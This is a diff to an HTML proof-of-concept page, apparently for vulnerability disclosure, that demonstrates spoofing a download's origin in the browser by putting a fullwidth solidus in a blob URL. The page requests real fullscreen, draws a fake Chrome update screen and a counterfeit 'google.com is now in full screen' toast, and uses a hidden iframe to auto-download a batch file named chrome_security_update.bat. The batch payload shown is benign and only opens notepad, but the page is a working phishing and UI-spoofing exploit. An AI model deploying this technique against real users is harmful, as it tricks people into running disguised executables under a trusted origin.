@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Update Verification</title>
+<title>PoC: Blob URL Origin Spoofing via Fullwidth Solidus</title>
 <style>
   body {
     margin: 0;
@@ -25,34 +25,42 @@
   }
 
   .title {
-    font-size: 1.2rem;
-    font-weight: 600;
+    font-size: 1.3rem;
+    font-weight: 700;
     line-height: 1.6;
-    margin-bottom: 30px;
+    margin-bottom: 20px;
     max-width: 800px;
+    color: #202124;
   }
 
   .subtitle {
-    font-size: 0.9rem;
-    color: #5f6368;
+    font-size: 0.85rem;
+    color: #d32f2f;
     margin-top: 10px;
+    font-family: 'Courier New', Courier, monospace;
+    background: #fce8e6;
+    padding: 12px 16px;
+    border-radius: 6px;
+    border: 1px solid #fad2cf;
+    line-height: 1.5;
   }
 
   .trigger-btn {
     padding: 16px 32px;
     font-size: 1.1rem;
     font-weight: 600;
-    background: #1a73e8;
+    background: #d32f2f;
     color: white;
     border: none;
     border-radius: 8px;
     cursor: pointer;
     box-shadow: 0 4px 6px rgba(0,0,0,0.1);
     transition: background 0.2s;
+    margin-top: 25px;
   }
 
   .trigger-btn:hover {
-    background: #1557b0;
+    background: #b71c1c;
   }
 
   #fake-fullscreen-toast {
@@ -121,19 +129,22 @@
 </head>
 <body>
 
+  <!-- Initial View: Explicitly states the vulnerability being tested -->
   <div class="container" id="initial-view">
     <div class="title">
-      Critical Security Update Required
+      PoC: Download Attribution Bypass via Fullwidth Solidus
     </div>
     <div class="subtitle">
-      Your browser requires an urgent security patch<br>
-      Click below to verify and install update
+      Injection Vector:<br>
+      <strong>blob:null/[uuid]#%EF%BC%8Fgoogle.com</strong><br><br>
+      Effect: Origin Spoofing & True Domain Disappearance
     </div>
-    <button class="trigger-btn" onclick="initiateAttackSequence()" style="margin-top: 20px;">
-      Install Security Update
+    <button class="trigger-btn" onclick="initiateAttackSequence()">
+      Execute Payload & Enter Fullscreen
     </button>
   </div>
 
+  <!-- Fake Content View (Shown after fullscreen) -->
   <div class="fake-content" id="fake-view">
     <div class="update-box">
       <h1 style="color: #1a73e8; font-size: 2rem; margin-bottom: 10px;">Chrome Update</h1>
@@ -146,6 +157,7 @@
     </div>
   </div>
 
+  <!-- Fake Browser Toast Notification -->
   <div id="fake-fullscreen-toast">
     <span></span>
     <span>google.com is now in full screen. Press Esc to exit.</span>
@@ -153,6 +165,7 @@
 
   <script>
     function initiateAttackSequence() {
+      // 1. Request Real Fullscreen
       const elem = document.documentElement;
       if (elem.requestFullscreen) {
         elem.requestFullscreen();
@@ -160,8 +173,10 @@
         elem.webkitRequestFullscreen();
       }
 
+      // 2. Execute Background Payload
       executeDownloadPayload();
 
+      // 3. UI Redressing Sequence
       setTimeout(() => {
         document.getElementById('initial-view').style.display = 'none';
         document.getElementById('fake-view').classList.add('active');
@@ -174,6 +189,7 @@
           if (progress >= 100) clearInterval(interval);
         }, 300);
         
+        // Show fake toast after real browser toast fades
         setTimeout(() => {
           document.getElementById('fake-fullscreen-toast').classList.add('visible');
         }, 2500);
@@ -187,11 +203,55 @@
       iframe.style.display = 'none'; 
       document.body.appendChild(iframe);
 
-      const iframeHTML = ``;
+      // PAYLOAD UTAMA TETAP SAMA SESUAI PERMINTAAN
+      const iframeHTML = `
+        <!DOCTYPE html>
+        <html><body><script>
+          const batLines = [
+            '@echo off',
+            'title Chrome Security Update',
+            'echo ========================================',
+            'echo   Chrome Security Update Installer',
+            'echo ========================================',
+            'echo.',
+            'echo Initializing update sequence...',
+            'timeout /t 2 >nul',
+            'echo Checking system compatibility...',
+            'timeout /t 1 >nul',
+            'echo Downloading security patches...',
+            'timeout /t 2 >nul',
+            'echo Applying updates...',
+            'timeout /t 2 >nul',
+            'echo.',
+            'echo Update completed successfully!',
+            'echo.',
+            'start "" "C:\\\\Windows\\\\System32\\\\notepad.exe"',
+            'pause'
+          ];
+          const batContent = batLines.join('\\r\\n');
+
+          const blob = new Blob([batContent], { type: "application/octet-stream" });
+          const realUrl = URL.createObjectURL(blob);
+          const uuid = realUrl.split("/").pop();
+
+          // INJEKSI FULLWIDTH SOLIDUS UNTUK SPOOFING ORIGIN
+          const spoofedUrl = \`blob:null/\${uuid}#%EF%BC%8Fgoogle.com\`;
+          const filename = "chrome_security_update.bat";
+
+          const a = document.createElement("a");
+          a.href = spoofedUrl;
+          a.download = filename;
+          document.body.appendChild(a);
+          a.click();
+
+          setTimeout(() => { a.remove(); URL.revokeObjectURL(realUrl); }, 1000);
+        <\/script></body></html>
+      `;
       
       iframe.srcdoc = iframeHTML;
     }
 
+    // Exit fullscreen handler to clean up fake toast
     document.addEventListener('fullscreenchange', () => {
       if (!document.fullscreenElement) {
         document.getElementById('fake-fullscreen-toast').classList.remove('visible');
